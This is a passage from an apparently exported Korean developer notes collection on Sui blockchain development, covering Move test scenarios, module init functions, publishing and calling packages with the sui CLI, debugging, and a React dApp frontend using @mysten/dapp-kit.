to the final owner\n            transfer::public_transfer(sword, final_owner);\n        };\n \n        // Third transaction executed by the final sword owner\n        scenario.next_tx(final_owner);\n        {\n            // Extract the sword owned by the final owner\n            let sword = scenario.take_from_sender&lt;Sword&gt;();\n            // Verify that the sword has expected properties\n            assert!(sword.magic() == 42 &amp;&amp; sword.strength() == 7, 1);\n            // Return the sword to the object pool (it cannot be simply &quot;dropped&quot;)\n            scenario.return_to_sender(sword)\n        };\n        scenario.end();\n    }\n주목할 점은 scenario.take_from_sender&lt;Type&gt;(); 메서드 입니다.\n이를 이용해 손쉽게 특정 타입(Sword)의 address-owned object 를 transaction에서 다룰 수 있게 됩니다.\n마지막 transaction에서 scenario.return_to_sender(sword)를 통해 앞에서의 drop 문제를 조금 더 유연하게 처리하고 있습니다.\n이 때, test_utils에서 제공하는 destroy&lt;T&gt;()를 사용할 수도 있습니다.\n마지막 코드만 다시 적어보면 아래와 같습니다.\n        use sui::test_utils;\n \n\t\t// ...\n \n        // Third transaction executed by the final sword owner\n        scenario.next_tx(final_owner);\n        {\n            // Extract the sword owned by the final owner\n            let sword = scenario.take_from_sender&lt;Sword&gt;();\n            // Verify that the sword has expected properties\n            assert!(sword.magic() == 42 &amp;&amp; sword.strength() == 7, 1);\n            // Return the sword to the object pool (it cannot be simply &quot;dropped&quot;)\n            // scenario.return_to_sender(sword)\n            test_utils::destroy&lt;Sword&gt;(sword)\n        };\n \n\n4. Module Initialize\nSmart Contract의 constructor 같은 존재입니다.\ninit() 함수로 작성되며, 아래와 같이 TxContext 타입을 인자로 받는 형식으로 작성되어야 합니다.\n\nfun init(ctx: &amp;TxContext)\nfun init(ctx: &amp;mut TxContext)\nfun init(otw: EXAMPLE, ctx: &amp;TxContext)\nfun init(otw: EXAMPLE, ctx: &amp;mut TxContext)\n\n또, 아래와 같은 규칙이 있습니다.\n\nReturn value 없음\nPrivate visibility\nmodule의 one-time witness value 를 첫 번째 인자로 받을 수 있음\n\n\n5. Publish a package\nSmart contract Deploy에 해당하는 작업입니다.\nnetwork는 active-env이고, 계정은 active-address입니다.\n아래와 같이 입력해서 배포할 수 있습니다.\nsui client publish\n\n물론 배포할 때는 gas 가 필요합니다.. (faucet에서 얻으면 됩니다)\n\n결과는 아래와 같이 아주 예쁜 TUI 로 보여줍니다.\n\n결과를 아래와 같이 나뉘어진 블록으로 설명하고 있습니다.\n\nTransaction Data\nTransaction Effect\nTransaction Block Event\nObject Changes\nBalance Changes\n\n이 중 active-address가 소유한 object를 아래와 같이 명령어를 입력해 살펴볼 수 있습니다.\nsui client objects\n\nObject 종류에 대해 설명하면 다음과 같습니다.\n\nCoin: faucet에서 받은 토큰입니다.\nUpgradeCap: publish 한 Package들이 여기에 receipt로 남게 된다고 합니다. 향후 package 를 업그레이드 할 때 사용하거나, burn 해서 업그레이드 할 수 없게 만들 때 이용한다고 합니다.\nForge: publish 한 Package의 init 함수에서 Forge object를 만들어서 (admin이라는 변수 명 사용) 현재 active-address인 ctx.sender()에게 transfer() 한 결과로 이해할 수 있습니다.\n\n4-1. Interact with Package\nPublish 된 Package와 상호작용하는 방법을 살펴봅니다.\n가장 간단한 방법은 아래 명령어를 사용하는 것입니다.\nsui client call --package &lt;PACKAGE-ID&gt; --module &lt;MODULE&gt; --functio &lt;FUNCTION&gt; --args ...\n\n\n                  \n                  Note\n                  \n                \n\nPACKAGE-ID 를 까먹었다면 다음과 같은 순서로 구할 수 있습니다.\n\n우선 sui client objects를 입력해 &lt;PACKAGE-ID&gt;::&lt;MODULE&gt;::Object로 명시된 objectType 을 확인합니다.\n\n\n\n중간에 생략된 &lt;PACKAGE-ID&gt;를 확인하기 위해서는 sui client object &lt;object-id&gt;를 입력하면 됩니다.\n\n\n\n\n실제로 sui client call 을 해보면 아래와 같습니다.\n지금은 Forge object를 알고 있기 때문에 이를 인자로 사용하는 swords_created을 호출해보았습니다.\n\n&gt; [!important]\n&gt; \n&gt; Docs 에서는 이보다 좀 더 유연한 방법인 `ptb`를 설명하고 있습니다.\n&gt; \n&gt; 이는 아래와 같이 명령어를 입력하는 방식입니다.\n&gt;\n&gt; ```\n&gt; sui client ptb \\\n&gt;     --assign forge @&lt;FORGE-ID&gt; \\\n&gt;     --assign to_address @&lt;TO-ADDRESS&gt; \\\n&gt;     --move-call &lt;PACKAGE-ID&gt;::example::sword_create 10 20 \\\n&gt;     --assign sword \\\n&gt;     --transfer-objects &quot;[sword]&quot; to_address \\\n&gt;     --gas-budget 20000000\n&gt; ```\n&gt; \t\n&gt; \t\n&gt; \t![[Pasted image 20241011005135.png]]\n\n\n5. Debugging\n개발 과정에서 디버깅도 아주 요긴하게 사용됩니다.\nuse std::debug;\n \ndebug::print(&amp;v);\ndebug::print_stack_trace();\n위와 같은 방법으로 적재적소에서 값을 찍어보면 됩니다.\n\n6. Client App w/ Sui TS SDK\n다음 글에서 이어 정리하겠습니다…\nSui, DApp Frontend"},"Res/Excalidraw/Drawing-2024-10-11-00.13.35.excalidraw":{"title":"Drawing 2024-10-11 00.13.35.excalidraw","links":["Res/Pasted-Image-20241011001408_267.png"],"tags":["excalidraw"],"content":"⚠  Switch to EXCALIDRAW VIEW in the MORE OPTIONS menu of this document. ⚠ You can decompress Drawing data with the command palette: ‘Decompress current Excalidraw file’. For more info check in plugin settings under ‘Saving’\nExcalidraw Data\nText Elements\nEmbedded Files\n5d874f8c0c54e801e480db51ef203f8b6daff120: Pasted Image 20241011001408_267.png"},"Sui,-DApp-Frontend":{"title":"Sui, DApp Frontend","links":[],"tags":["SUI","개발","Web3"],"content":"1. Example\nyarn create @mysten/dapp --template react-client-dapp\n \n# &lt;ENTER&gt;\n \ncd my-first-sui-dapp\n \nyarn\n \nyarn dev\n\n지갑을 연결해볼 수 있는 예제 사이트가 나옵니다.\n\n2. 코드 분석\n2-1. Provider\nmain.tsx 에는 세 종류의 Provider가 존재합니다.\n// main.tsx\nReactDOM.createRoot(document.getElementById(&quot;root&quot;)!).render(\n  &lt;React.StrictMode&gt;\n    &lt;Theme appearance=&quot;dark&quot;&gt;\n      &lt;QueryClientProvider client={queryClient}&gt;\n        &lt;SuiClientProvider networks={networkConfig} defaultNetwork=&quot;testnet&quot;&gt;\n          &lt;WalletProvider autoConnect&gt;\n            &lt;App /&gt;\n          &lt;/WalletProvider&gt;\n        &lt;/SuiClientProvider&gt;\n      &lt;/QueryClientProvider&gt;\n    &lt;/Theme&gt;\n  &lt;/React.StrictMode&gt;,\n);\n\nQueryClientProvider\nSuiClientProvider\nWalletProvider\n\n2-2. Connect to Wallet\nApp.tsx 에서 ConnectButton 컴포넌트를 활용하여 지갑을 연결할 수 있도록 합니다.\n// App.tsx\nimport { ConnectButton } from &#039;@mysten/dapp-kit&#039;;\n \nfunction App() {\n\treturn (\n\t\t&lt;div className=&quot;App&quot;&gt;\n\t\t\t&lt;header className=&quot;App-header&quot;&gt;\n\t\t\t\t&lt;ConnectButton /&gt;\n\t\t\t&lt;/header&gt;\n\t\t&lt;/div&gt;\n\t);\n}\n2-3. Account 정보 활용\n지갑이 연결 되었으므로, userCurrentAccount() Hook을 아래와 같이 활용합니다.\n// WalletStatus.tsx\nimport { useCurrentAccount } from &quot;@mysten/dapp-kit&quot;;\nimport { Container, Flex, Heading, Text } from &quot;@radix-ui/themes&quot;;\nimport { OwnedObjects } from &quot;./OwnedObjects&quot;;\n \nexport function WalletStatus() {\n  const account = useCurrentAccount();\n \n  return (\n    &lt;Container my=&quot;2&quot;&gt;\n      &lt;Heading mb=&quot;2&quot;&gt;Wallet Status&lt;/Heading&gt;\n \n      {account ? (\n        &lt;Flex direction=&quot;column&quot;&gt;\n          &lt;Text&gt;Wallet connected&lt;/Text&gt;\n          &lt;Text&gt;Address: {account.address}&lt;/Text&gt;\n        &lt;/Flex&gt;\n      ) : (\n        &lt;Text&gt;Wallet not connected&lt;/Text&gt;\n      )}\n      &lt;OwnedObjects /&gt;\n    &lt;/Container&gt;\n  );\n}\n2-4. On-chain data 활용\nuseSuiClientQuery 같은 hook 을 이용하면 현재 계정이 소유하고 있는 object를 가져오는 것도 가능합니다.\nimport { useCurrentAccount, useSuiClientQuery } from &#039;@mysten/dapp-kit&#039;;\n \nfunction ConnectedAccount() {\n\tconst account = useCurrentAccount();\n \n\tif (!account) {\n\t\treturn null;\n\t}\n \n\treturn (\n\t\t&lt;div&gt;\n\t\t\t&lt;div&gt;Connected to {account.address}&lt;/div&gt;;\n\t\t\t&lt;OwnedObjects address={account.address} /&gt;\n\t\t&lt;/div&gt;\n\t);\n}\n \nfunction OwnedObjects({ address }: { address: string }) {\n\tconst { data } = useSuiClientQuery(&#039;getOwnedObjects&#039;, {\n\t\towner: address,\n\t});\n\tif (!data) {\n\t\treturn null;\n\t}\n \n\treturn (\n\t\t&lt;ul&gt;\n\t\t\t{data.data.map((object) =&gt; (\n\t\t\t\t&lt;li key={object.data}&gt;\n\t\t\t\t\t&lt;a href={`example-explorer.com/object/${object.data}`}&gt;\n\t\t\t\t\t\t{object.data}\n\t\t\t\t\t&lt;/a&gt;\n\t\t\t\t&lt;/li&gt;\n\t\t\t))}\n\t\t&lt;/ul&gt;\n\t);\n}"}}